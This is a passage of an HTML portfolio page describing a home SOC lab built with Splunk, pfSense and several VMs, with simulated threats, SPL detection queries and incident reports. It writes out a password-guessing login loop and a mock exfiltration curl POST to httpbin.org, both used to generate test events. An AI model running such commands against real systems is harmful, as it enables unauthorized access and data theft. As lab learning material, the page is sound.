@@ -1,0 +1,754 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise SOC Monitoring Platform | Likith Raj</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" media="print" onload="this.media='all'">
+    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"></noscript>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; scroll-behavior: smooth; }
+
+        :root {
+            --bg: #0a0a0f;
+            --text: #e0e0e0;
+            --text-muted: #999;
+            --card: rgba(255,255,255,0.02);
+            --card-border: rgba(255,255,255,0.04);
+            --purple: #7c3aed;
+            --purple-light: #a78bfa;
+            --cyan: #06b6d4;
+            --green: #22c55e;
+            --amber: #f59e0b;
+            --red: #ef4444;
+        }
+
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            overflow-x: hidden;
+        }
+
+        /* BUBBLES */
+        .bubbles { position: fixed; inset: 0; z-index: 0; overflow: hidden; pointer-events: none; }
+        .bub { position: absolute; border-radius: 50%; opacity: 0.05; animation: bubFloat 25s ease-in-out infinite alternate; }
+        .bub:nth-child(1) { width: 300px; height: 300px; background: var(--purple); top: -10%; left: -5%; }
+        .bub:nth-child(2) { width: 250px; height: 250px; background: var(--cyan); bottom: -10%; right: -5%; animation-delay: -8s; }
+        .bub:nth-child(3) { width: 180px; height: 180px; background: var(--amber); top: 40%; left: 60%; animation-delay: -15s; }
+        @keyframes bubFloat { 0%{transform:translate(0,0)} 50%{transform:translate(60px,-40px)} 100%{transform:translate(-40px,60px)} }
+
+        .wrapper { position: relative; z-index: 1; }
+
+        /* NAV */
+        nav {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+            background: rgba(10,10,15,0.88); backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--card-border);
+            padding: 14px 32px; display: flex; align-items: center; justify-content: space-between;
+        }
+        .logo {
+            font-size: 1.2rem; font-weight: 800; text-decoration: none;
+            background: linear-gradient(135deg, var(--purple-light), var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a {
+            color: var(--text-muted); text-decoration: none; font-size: 0.8rem;
+            font-weight: 500; letter-spacing: 0.5px; transition: 0.3s;
+        }
+        .nav-links a:hover { color: var(--purple-light); }
+
+        /* HERO */
+        .hero {
+            min-height: 55vh; display: flex; flex-direction: column;
+            align-items: center; justify-content: center; text-align: center;
+            padding: 100px 20px 50px;
+        }
+        .badge {
+            display: inline-block; padding: 5px 16px; border-radius: 50px;
+            background: rgba(124,58,237,0.1); border: 1px solid rgba(124,58,237,0.25);
+            color: var(--purple-light); font-size: 0.7rem; font-weight: 600;
+            letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 20px;
+        }
+        .hero h1 {
+            font-size: 2.8rem; font-weight: 800; line-height: 1.2;
+            background: linear-gradient(135deg, #fff, var(--purple-light), var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            max-width: 750px; margin-bottom: 14px;
+        }
+        .hero p { color: var(--text-muted); font-size: 1rem; max-width: 550px; }
+        .hero-tags { display: flex; flex-wrap: wrap; gap: 8px; justify-content: center; margin-top: 20px; }
+
+        /* SECTION */
+        .sec { max-width: 900px; margin: 0 auto; padding: 48px 20px; }
+        .sec-title {
+            font-size: 1.6rem; font-weight: 700; margin-bottom: 8px;
+            color: var(--purple-light);
+        }
+        .sec-sub {
+            color: var(--text-muted); font-size: 0.8rem; letter-spacing: 0.5px;
+            text-transform: uppercase; margin-bottom: 28px;
+        }
+
+        /* STATS */
+        .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 14px; max-width: 900px; margin: 0 auto 40px; }
+        .stat {
+            background: var(--card); border: 1px solid var(--card-border);
+            border-radius: 14px; padding: 20px; text-align: center;
+            transition: 0.3s;
+        }
+        .stat:hover { transform: translateY(-3px); border-color: rgba(124,58,237,0.25); }
+        .stat-num {
+            font-size: 1.8rem; font-weight: 800;
+            background: linear-gradient(135deg, var(--purple-light), var(--cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .stat-lbl { color: var(--text-muted); font-size: 0.7rem; letter-spacing: 0.8px; text-transform: uppercase; margin-top: 2px; }
+
+        /* CARDS */
+        .card {
+            background: var(--card); border: 1px solid var(--card-border);
+            border-radius: 14px; padding: 28px; margin-bottom: 16px;
+            transition: 0.3s;
+        }
+        .card:hover { border-color: rgba(124,58,237,0.2); }
+        .card h3 { font-size: 1.1rem; font-weight: 700; margin-bottom: 10px; color: var(--purple-light); }
+        .card h4 { font-size: 0.95rem; font-weight: 600; margin: 14px 0 6px; color: var(--cyan); }
+        .card p, .card li { color: var(--text-muted); font-size: 0.88rem; line-height: 1.8; }
+        .card ul { padding-left: 18px; }
+        .card li { margin-bottom: 4px; }
+        .card strong { color: var(--text); }
+
+        /* SIMPLE EXPLANATION BOX */
+        .explain-box {
+            background: rgba(6,182,212,0.04); border: 1px solid rgba(6,182,212,0.15);
+            border-radius: 14px; padding: 24px; margin: 20px 0;
+        }
+        .explain-box h4 { color: var(--cyan); margin-bottom: 8px; font-size: 0.95rem; }
+        .explain-box p { color: var(--text-muted); font-size: 0.88rem; }
+
+        /* SIMPLE STEPS */
+        .steps { margin: 20px 0; }
+        .step {
+            display: flex; gap: 16px; margin-bottom: 20px;
+            align-items: flex-start;
+        }
+        .step-num {
+            min-width: 36px; height: 36px; border-radius: 50%;
+            background: rgba(124,58,237,0.15); border: 1px solid rgba(124,58,237,0.3);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--purple-light); font-weight: 700; font-size: 0.85rem;
+        }
+        .step-content h4 { color: var(--text); font-size: 0.9rem; font-weight: 600; margin-bottom: 4px; }
+        .step-content p { color: var(--text-muted); font-size: 0.85rem; }
+
+        /* TOPOLOGY */
+        .topo {
+            background: rgba(124,58,237,0.03); border: 1px solid rgba(124,58,237,0.12);
+            border-radius: 14px; padding: 28px; margin: 20px 0;
+            font-family: 'Courier New', monospace; font-size: 0.8rem;
+            line-height: 1.5; color: var(--purple-light); overflow-x: auto;
+            white-space: pre;
+        }
+
+        /* ARCH GRID */
+        .arch-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 12px; margin: 16px 0; }
+        .arch-item {
+            background: rgba(124,58,237,0.03); border: 1px solid rgba(124,58,237,0.1);
+            border-radius: 12px; padding: 18px; text-align: center;
+        }
+        .arch-item i { font-size: 1.8rem; margin-bottom: 6px; display: block; }
+        .arch-item .name { font-weight: 700; color: var(--purple-light); font-size: 0.85rem; }
+        .arch-item .ip { color: var(--text-muted); font-size: 0.75rem; margin-top: 2px; }
+        .arch-item .role { color: var(--cyan); font-size: 0.72rem; margin-top: 2px; }
+
+        /* TABLE */
+        .tbl { width: 100%; border-collapse: collapse; margin: 14px 0; }
+        .tbl th, .tbl td { padding: 10px 14px; text-align: left; font-size: 0.82rem; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        .tbl th { color: var(--purple-light); font-weight: 600; text-transform: uppercase; letter-spacing: 0.4px; font-size: 0.72rem; background: rgba(124,58,237,0.05); }
+        .tbl td { color: var(--text-muted); }
+
+        /* CODE */
+        .code {
+            background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.04);
+            border-radius: 10px; padding: 14px 18px; margin: 10px 0;
+            font-family: 'Courier New', monospace; font-size: 0.78rem;
+            color: var(--green); overflow-x: auto; white-space: pre;
+        }
+
+        /* TAGS */
+        .tag {
+            display: inline-block; padding: 3px 10px; border-radius: 50px;
+            font-size: 0.68rem; font-weight: 600; letter-spacing: 0.3px;
+            margin-right: 4px; margin-bottom: 4px;
+        }
+        .t-pur { background: rgba(124,58,237,0.12); color: var(--purple-light); border: 1px solid rgba(124,58,237,0.25); }
+        .t-cya { background: rgba(6,182,212,0.12); color: #22d3ee; border: 1px solid rgba(6,182,212,0.25); }
+        .t-grn { background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.25); }
+        .t-amb { background: rgba(245,158,11,0.12); color: #fbbf24; border: 1px solid rgba(245,158,11,0.25); }
+        .t-red { background: rgba(239,68,68,0.12); color: #f87171; border: 1px solid rgba(239,68,68,0.25); }
+
+        /* INCIDENT */
+        .incident {
+            background: var(--card); border: 1px solid var(--card-border);
+            border-radius: 14px; overflow: hidden; margin-bottom: 20px;
+        }
+        .inc-head {
+            padding: 16px 24px; background: rgba(124,58,237,0.03);
+            border-bottom: 1px solid rgba(255,255,255,0.03);
+            display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
+        }
+        .inc-head h3 { font-size: 1rem; color: var(--purple-light); }
+        .sev {
+            padding: 2px 8px; border-radius: 50px; font-size: 0.65rem;
+            font-weight: 600; text-transform: uppercase; letter-spacing: 0.4px;
+            background: rgba(34,197,94,0.12); color: #4ade80; border: 1px solid rgba(34,197,94,0.25);
+        }
+        .inc-body { padding: 20px 24px; }
+        .inc-body table { width: 100%; }
+        .inc-body th { text-align: left; padding: 6px 10px; font-size: 0.72rem; color: var(--purple-light); font-weight: 600; text-transform: uppercase; letter-spacing: 0.4px; width: 140px; vertical-align: top; }
+        .inc-body td { padding: 6px 10px; font-size: 0.82rem; color: var(--text-muted); line-height: 1.6; }
+
+        /* DIVIDER */
+        .div { height: 1px; background: linear-gradient(90deg, transparent, rgba(124,58,237,0.15), transparent); margin: 40px 0; }
+
+        /* FOOTER */
+        footer { text-align: center; padding: 36px 20px; border-top: 1px solid var(--card-border); color: var(--text-muted); font-size: 0.75rem; }
+        footer a { color: var(--purple-light); text-decoration: none; }
+
+        /* BACK BUTTON - BOTTOM RIGHT */
+        .back-float {
+            position: fixed; bottom: 30px; right: 30px; z-index: 99;
+            width: 50px; height: 50px; border-radius: 50%;
+            background: rgba(124,58,237,0.2); border: 1px solid rgba(124,58,237,0.4);
+            display: flex; align-items: center; justify-content: center;
+            color: var(--purple-light); font-size: 1.1rem; text-decoration: none;
+            backdrop-filter: blur(10px); transition: 0.3s;
+            box-shadow: 0 4px 20px rgba(124,58,237,0.2);
+        }
+        .back-float:hover { background: rgba(124,58,237,0.35); transform: translateY(-3px); }
+
+        /* RESPONSIVE */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 1.8rem; }
+            .stats { grid-template-columns: repeat(2,1fr); }
+            .arch-grid { grid-template-columns: 1fr; }
+            nav { padding: 12px 16px; }
+            .nav-links { gap: 14px; }
+            .sec { padding: 32px 16px; }
+            .inc-body th { width: 100px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="bubbles">
+    <div class="bub"></div>
+    <div class="bub"></div>
+    <div class="bub"></div>
+</div>
+
+<div class="wrapper">
+
+    <!-- NAV -->
+    <nav>
+        <a href="index.html" class="logo"><i class="fas fa-shield-halved"></i> LIKITH RAJ</a>
+        <div class="nav-links">
+            <a href="index.html">HOME</a>
+            <a href="index.html#projects">PROJECTS</a>
+            <a href="index.html#skills">SKILLS</a>
+            <a href="index.html#certifications">CERTS</a>
+        </div>
+    </nav>
+
+    <!-- HERO -->
+    <div class="hero">
+        <div class="badge">SOC HOME LAB PROJECT</div>
+        <h1>Enterprise SOC Monitoring & Security Incident Detection Platform</h1>
+        <p>I built a complete Security Operations Center in my home using 4 virtual machines, Splunk SIEM, and real attack scenarios to detect threats like a real SOC analyst.</p>
+        <div class="hero-tags">
+            <span class="tag t-pur">SPLUNK SIEM</span>
+            <span class="tag t-cya">PFSENSE</span>
+            <span class="tag t-grn">WINDOWS</span>
+            <span class="tag t-amb">LINUX</span>
+            <span class="tag t-red">KALI</span>
+        </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats">
+        <div class="stat"><div class="stat-num">4</div><div class="stat-lbl">Virtual Machines</div></div>
+        <div class="stat"><div class="stat-num">7,363</div><div class="stat-lbl">Events Collected</div></div>
+        <div class="stat"><div class="stat-num">3</div><div class="stat-lbl">Threat Scenarios</div></div>
+        <div class="stat"><div class="stat-num">2</div><div class="stat-lbl">Alerts Configured</div></div>
+    </div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 1: WHAT IS THIS PROJECT? -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">What Is This Project?</div>
+        <div class="sec-sub">SIMPLE EXPLANATION</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-lightbulb"></i> In Simple Words</h4>
+            <p>A <strong>Security Operations Center (SOC)</strong> is like a security guard room for computer networks. Real companies use SOC teams to watch for hackers and threats 24/7. I built a <strong>mini version of this at home</strong> using virtual machines to practice and learn how real SOC analysts work.</p>
+        </div>
+
+        <div class="card">
+            <h3>What I Built</h3>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-num">1</div>
+                    <div class="step-content">
+                        <h4>Set up 4 virtual computers</h4>
+                        <p>Windows, Ubuntu Linux, Kali Linux (attacker), and pfSense firewall &mdash; all connected on a private network.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-num">2</div>
+                    <div class="step-content">
+                        <h4>Installed Splunk SIEM</h4>
+                        <p>Splunk is the brain of a SOC. I installed it to collect and analyze logs from all machines in one place.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-num">3</div>
+                    <div class="step-content">
+                        <h4>Connected all machines to Splunk</h4>
+                        <p>Installed "forwarders" on Windows and Ubuntu to automatically send their security logs to Splunk.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-num">4</div>
+                    <div class="step-content">
+                        <h4>Ran real attack scenarios</h4>
+                        <p>Used Kali Linux to scan ports, simulated failed logins, and tested data exfiltration &mdash; all within my lab.</p>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-num">5</div>
+                    <div class="step-content">
+                        <h4>Detect, investigate, document</h4>
+                        <p>Used Splunk to search logs, find suspicious activity, create alerts, and write incident reports &mdash; just like a real SOC analyst.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Technologies Used</h3>
+            <div style="display:flex;flex-wrap:wrap;gap:6px;margin-top:6px;">
+                <span class="tag t-pur">Splunk Enterprise (SIEM)</span>
+                <span class="tag t-cya">Splunk Universal Forwarder</span>
+                <span class="tag t-grn">VirtualBox (Virtualization)</span>
+                <span class="tag t-amb">pfSense (Firewall)</span>
+                <span class="tag t-grn">Windows 10/11</span>
+                <span class="tag t-cya">Ubuntu Server</span>
+                <span class="tag t-red">Kali Linux</span>
+                <span class="tag t-amb">Nmap (Scanning Tool)</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 2: NETWORK ARCHITECTURE -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">How the Lab is Set Up</div>
+        <div class="sec-sub">NETWORK ARCHITECTURE</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-network-wired"></i> What This Means</h4>
+            <p>All 4 virtual machines are connected to a <strong>private network</strong> (like a home WiFi). The pfSense firewall sits in the middle controlling traffic. Splunk runs on my main PC and collects logs from all machines.</p>
+        </div>
+
+        <div class="topo">                    INTERNET
+                        |
+                        v
+                    pfSense  (Firewall / Gateway)
+                    IP: 10.0.0.1
+                        |
+            HOST-ONLY PRIVATE NETWORK
+                        |
+    +-----------+-----------+-----------+
+    |           |           |           |
+    v           v           v           v
+  Windows     Ubuntu      Kali      Splunk (My PC)
+  10.0.0.101  10.0.0.100  10.0.0.30  10.0.0.2
+    |           |           |           |
+    +-----------+-----------+-----------+
+                        |
+                        v
+                 SPLUNK ENTERPRISE
+              (Collects all logs here)</div>
+
+        <div class="arch-grid">
+            <div class="arch-item">
+                <i class="fas fa-shield-halved" style="color:var(--amber);"></i>
+                <div class="name">pfSense</div>
+                <div class="ip">10.0.0.1</div>
+                <div class="role">Firewall &mdash; Controls traffic between machines</div>
+            </div>
+            <div class="arch-item">
+                <i class="fab fa-windows" style="color:#3b82f6;"></i>
+                <div class="name">Windows 10/11</div>
+                <div class="ip">10.0.0.101</div>
+                <div class="role">Target machine &mdash; Logs security events</div>
+            </div>
+            <div class="arch-item">
+                <i class="fab fa-ubuntu" style="color:#e95420;"></i>
+                <div class="name">Ubuntu Server</div>
+                <div class="ip">10.0.0.100</div>
+                <div class="role">Secondary machine &mdash; Sends system logs</div>
+            </div>
+            <div class="arch-item">
+                <i class="fas fa-skull-crossbones" style="color:var(--red);"></i>
+                <div class="name">Kali Linux</div>
+                <div class="ip">10.0.0.30</div>
+                <div class="role">Attacker machine &mdash; Generates threats</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 3: HOW LOGS GET TO SPLUNK -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">How Logs Get to Splunk</div>
+        <div class="sec-sub">LOG COLLECTION PIPELINE</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-database"></i> Why This Matters</h4>
+            <p>In a real SOC, all machines send their logs to one central place (SIEM). I set up the same thing using <strong>Splunk Universal Forwarders</strong> &mdash; small programs installed on each machine that automatically ship logs to Splunk.</p>
+        </div>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-num">1</div>
+                <div class="step-content">
+                    <h4>Splunk Enterprise on My PC (10.0.0.2)</h4>
+                    <p>Receives logs on <strong>TCP port 9997</strong> (from forwarders) and <strong>UDP port 514</strong> (from pfSense firewall).</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">2</div>
+                <div class="step-content">
+                    <h4>Windows Forwarder &rarr; Sends 611 security events</h4>
+                    <p>Monitors <strong>Security.evtx</strong> (Windows event log with login attempts, account changes, etc.)</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">3</div>
+                <div class="step-content">
+                    <h4>Ubuntu Forwarder &rarr; Sends 6,640 system events</h4>
+                    <p>Monitors <strong>auth.log</strong> and <strong>syslog</strong> (authentication and system activity logs)</p>
+                </div>
+            </div>
+            <div class="step">
+                <div class="step-num">4</div>
+                <div class="step-content">
+                    <h4>pfSense Firewall &rarr; Sends 109-125 network logs</h4>
+                    <p>Forwards firewall logs directly to Splunk via syslog protocol.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h3>Event Summary</h3>
+            <table class="tbl">
+                <thead><tr><th>Source Machine</th><th>Type of Logs</th><th>Events</th><th>Status</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Ubuntu</strong></td><td>System logs (syslog)</td><td>6,640</td><td><span class="tag t-grn">CONFIRMED</span></td></tr>
+                    <tr><td><strong>Windows</strong></td><td>Security event logs</td><td>611</td><td><span class="tag t-grn">CONFIRMED</span></td></tr>
+                    <tr><td><strong>pfSense</strong></td><td>Firewall logs</td><td>109-125</td><td><span class="tag t-grn">CONFIRMED</span></td></tr>
+                    <tr><td colspan="2"><strong>TOTAL</strong></td><td><strong>7,363</strong></td><td><span class="tag t-pur">VERIFIED</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 4: ATTACK SCENARIOS -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">What Threats I Simulated</div>
+        <div class="sec-sub">3 REAL ATTACK SCENARIOS</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-crosshairs"></i> How a SOC Analyst Thinks</h4>
+            <p>A SOC analyst always asks: <strong>What happened? Who did it? When? What should we do?</strong> I simulated 3 common threats and investigated each one using Splunk &mdash; the same way a real analyst would.</p>
+        </div>
+
+        <!-- SCENARIO 1 -->
+        <div class="card" style="border-left: 3px solid var(--amber);">
+            <h3><i class="fas fa-lock" style="color:var(--amber);"></i> Scenario 1: Failed Login Attempts (Brute Force)</h3>
+            <p><strong>What happened?</strong> Someone tried to log into the Windows machine with a wrong password 20 times in a row. This is what hackers do when they try to guess passwords.</p>
+            <p style="margin-top:8px;"><strong>How I generated it:</strong></p>
+            <div class="code">for /L %i in (1,1,20) do net use \\localhost\IPC$ /user:fakeuser FakePass123
+System error 1326: Logon failure - unknown user name or bad password.</div>
+            <p style="margin-top:8px;"><strong>How I detected it in Splunk:</strong></p>
+            <div class="code">index=main EventCode=4625
+| stats count by Account_Name, ComputerName</div>
+            <p style="margin-top:8px;"><strong>What I learned:</strong> Splunk's Windows Add-on uses <code>Account_Name</code> field, not <code>user</code>. My first search returned empty until I used the correct field name. Found <strong>4-5 failed login events</strong>.</p>
+            <div style="margin-top:12px;">
+                <span class="tag t-grn">RESOLVED</span>
+                <span class="tag t-pur">EVENT ID 4625</span>
+                <span class="tag t-cya">FIELD NAME FIX</span>
+            </div>
+        </div>
+
+        <!-- SCENARIO 2 -->
+        <div class="card" style="border-left: 3px solid var(--red);">
+            <h3><i class="fas fa-arrow-up" style="color:var(--red);"></i> Scenario 2: Data Exfiltration (Data Stealing)</h3>
+            <p><strong>What happened?</strong> Someone on the Ubuntu machine tried to send data outside the network to a public server. This simulates a hacker stealing sensitive information.</p>
+            <p style="margin-top:8px;"><strong>How I generated it:</strong></p>
+            <div class="code">curl -X POST -d "test=exfiltration" https://httpbin.org/post</div>
+            <p style="margin-top:8px;"><strong>How I detected it in Splunk:</strong></p>
+            <div class="code">index=main "exfiltration"</div>
+            <p style="margin-top:8px;"><strong>Result:</strong> Found <strong>1 matching event</strong> confirming the data transfer attempt. No real data left the lab &mdash; this was a safe simulation.</p>
+            <div style="margin-top:12px;">
+                <span class="tag t-grn">CONFIRMED</span>
+                <span class="tag t-red">DATA EXFILTRATION</span>
+                <span class="tag t-cya">UBUNTU SYSLOG</span>
+            </div>
+        </div>
+
+        <!-- SCENARIO 3 -->
+        <div class="card" style="border-left: 3px solid var(--purple);">
+            <h3><i class="fas fa-user-plus" style="color:var(--purple);"></i> Scenario 3: Unauthorized Account Creation</h3>
+            <p><strong>What happened?</strong> Someone created a new user account on the Windows machine. Hackers often do this to create backdoor access.</p>
+            <p style="margin-top:8px;"><strong>How I detected it in Splunk:</strong></p>
+            <div class="code">index=main EventCode=4720
+| stats count</div>
+            <p style="margin-top:8px;"><strong>What I learned:</strong> First search returned 0 results because the log hadn't been forwarded yet. After waiting a few seconds and searching again, I found <strong>1 account creation event</strong>. This taught me about forwarder latency.</p>
+            <div style="margin-top:12px;">
+                <span class="tag t-grn">RESOLVED</span>
+                <span class="tag t-pur">EVENT ID 4720</span>
+                <span class="tag t-amb">TIMING LESSON</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 5: ALERTS -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">Splunk Alerts</div>
+        <div class="sec-sub">AUTOMATED THREAT NOTIFICATIONS</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-bell"></i> What Alerts Do</h4>
+            <p>In a real SOC, analysts can't watch screens 24/7. <strong>Alerts</strong> automatically notify them when something suspicious happens. I set up 2 alerts that trigger when threats are detected.</p>
+        </div>
+
+        <div class="card">
+            <table class="tbl">
+                <thead><tr><th>Alert Name</th><th>When It Triggers</th><th>Status</th></tr></thead>
+                <tbody>
+                    <tr><td><strong>Multiple Failed Logins Detected</strong></td><td>When 3+ failed login attempts happen (Event ID 4625)</td><td><span class="tag t-grn">ENABLED</span></td></tr>
+                    <tr><td><strong>Network Port Scan Detected</strong></td><td>When suspicious port scanning activity is found</td><td><span class="tag t-grn">ENABLED</span></td></tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 6: INCIDENT REPORTS -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">Incident Investigation Reports</div>
+        <div class="sec-sub">DOCUMENTED FINDINGS FOR EACH THREAT</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-file-alt"></i> Why Reports Matter</h4>
+            <p>Every time a SOC analyst finds a threat, they write an <strong>incident report</strong> documenting what happened, how they found it, and what should be done next. This is critical evidence for security teams and management.</p>
+        </div>
+
+        <!-- INCIDENT 1 -->
+        <div class="incident">
+            <div class="inc-head">
+                <i class="fas fa-exclamation-triangle" style="color:var(--amber);"></i>
+                <h3>Failed Login Attempts</h3>
+                <span class="sev">LOW SEVERITY</span>
+            </div>
+            <div class="inc-body">
+                <table>
+                    <tr><th>Affected Machine</th><td>Windows (10.0.0.101)</td></tr>
+                    <tr><th>Log Source</th><td>Windows Security Event Log (Event ID 4625)</td></tr>
+                    <tr><th>What Happened</th><td>Multiple failed login attempts with wrong username/password</td></tr>
+                    <tr><th>Evidence Found</th><td>4-5 matching events with Account_Name, Account_Domain, Failure_Reason fields</td></tr>
+                    <tr><th>Root Cause</th><td>Authorized testing &mdash; not a real attack</td></tr>
+                    <tr><th>Lesson Learned</th><td>Use <code>Account_Name</code> not <code>user</code> when searching Windows logs in Splunk</td></tr>
+                    <tr><th>Status</th><td><span class="tag t-grn">BENIGN - AUTHORIZED TESTING</span></td></tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- INCIDENT 2 -->
+        <div class="incident">
+            <div class="inc-head">
+                <i class="fas fa-exclamation-triangle" style="color:var(--amber);"></i>
+                <h3>Data Exfiltration Simulation</h3>
+                <span class="sev">LOW SEVERITY</span>
+            </div>
+            <div class="inc-body">
+                <table>
+                    <tr><th>Affected Machine</th><td>Ubuntu (10.0.0.100)</td></tr>
+                    <tr><th>Log Source</th><td>Ubuntu System Log (syslog)</td></tr>
+                    <tr><th>What Happened</th><td>Outbound data transfer attempted to a public server (httpbin.org)</td></tr>
+                    <tr><th>Evidence Found</th><td>1 matching event confirming the curl POST request</td></tr>
+                    <tr><th>Root Cause</th><td>Safe simulation &mdash; no real data left the lab</td></tr>
+                    <tr><th>Lesson Learned</th><td>Monitor outbound traffic patterns and volume spikes for real threats</td></tr>
+                    <tr><th>Status</th><td><span class="tag t-grn">BENIGN - AUTHORIZED TESTING</span></td></tr>
+                </table>
+            </div>
+        </div>
+
+        <!-- INCIDENT 3 -->
+        <div class="incident">
+            <div class="inc-head">
+                <i class="fas fa-exclamation-triangle" style="color:var(--amber);"></i>
+                <h3>User Account Creation</h3>
+                <span class="sev">LOW SEVERITY</span>
+            </div>
+            <div class="inc-body">
+                <table>
+                    <tr><th>Affected Machine</th><td>Windows (10.0.0.101)</td></tr>
+                    <tr><th>Log Source</th><td>Windows Security Event Log (Event ID 4720)</td></tr>
+                    <tr><th>What Happened</th><td>New user account created on the system</td></tr>
+                    <tr><th>Evidence Found</th><td>1 matching Event ID 4720 event</td></tr>
+                    <tr><th>Root Cause</th><td>Controlled testing &mdash; account created intentionally</td></tr>
+                    <tr><th>Lesson Learned</th><td>Allow time for log forwarding before searching &mdash; forwarders have latency</td></tr>
+                    <tr><th>Status</th><td><span class="tag t-grn">BENIGN - AUTHORIZED TESTING</span></td></tr>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 7: SPLUNK QUERIES -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">Splunk Search Queries</div>
+        <div class="sec-sub">SPL QUERIES I USED</div>
+
+        <div class="explain-box">
+            <h4><i class="fas fa-search"></i> What is SPL?</h4>
+            <p><strong>SPL (Search Processing Language)</strong> is how you ask Splunk questions about your logs. It's like SQL but for security logs. These are the main queries I used to investigate threats.</p>
+        </div>
+
+        <div class="card">
+            <h4>Check All Sources Feeding Logs</h4>
+            <div class="code">index=main
+| stats count by host
+| sort - count</div>
+        </div>
+        <div class="card">
+            <h4>Find Failed Logins</h4>
+            <div class="code">index=main EventCode=4625
+| stats count by Account_Name, ComputerName</div>
+        </div>
+        <div class="card">
+            <h4>Find New Account Creations</h4>
+            <div class="code">index=main EventCode=4720
+| stats count</div>
+        </div>
+        <div class="card">
+            <h4>Detect Data Exfiltration</h4>
+            <div class="code">index=main "exfiltration"</div>
+        </div>
+        <div class="card">
+            <h4>Overview of All Events by Machine</h4>
+            <div class="code">index=main
+| stats count by host, sourcetype
+| sort - count</div>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 8: TROUBLESHOOTING -->
+    <!-- ============================================ -->
+    <div class="sec">
+        <div class="sec-title">Problems I Solved</div>
+        <div class="sec-sub">TROUBLESHOOTING CHALLENGES</div>
+
+        <div class="card">
+            <h3>Ubuntu Forwarder Permission Errors</h3>
+            <p><strong>Problem:</strong> The forwarder wouldn't start due to file ownership errors.</p>
+            <p><strong>Solution:</strong> Fixed permissions with chown/chmod and restarted.</p>
+            <div class="code">sudo chown -R user:user /opt/splunkforwarder
+sudo chmod -R 755 /opt/splunkforwarder</div>
+        </div>
+
+        <div class="card">
+            <h3>Wrong Field Name in Splunk Search</h3>
+            <p><strong>Problem:</strong> Searching by <code>user</code> field returned empty results.</p>
+            <p><strong>Solution:</strong> Splunk's Windows Add-on uses <code>Account_Name</code> instead. Changed the query to use the correct field.</p>
+        </div>
+
+        <div class="card">
+            <h3>Logs Not Showing Up Immediately</h3>
+            <p><strong>Problem:</strong> Event ID 4720 search returned 0 results right after generating the event.</p>
+            <p><strong>Solution:</strong> Wait a few seconds for the forwarder to send and Splunk to index the event before searching again.</p>
+        </div>
+    </div>
+
+    <div class="div"></div>
+
+    <!-- ============================================ -->
+    <!-- SECTION 9: WHAT I LEARNED -->
+    <!-- ============================================ -->
+    <div class="sec">
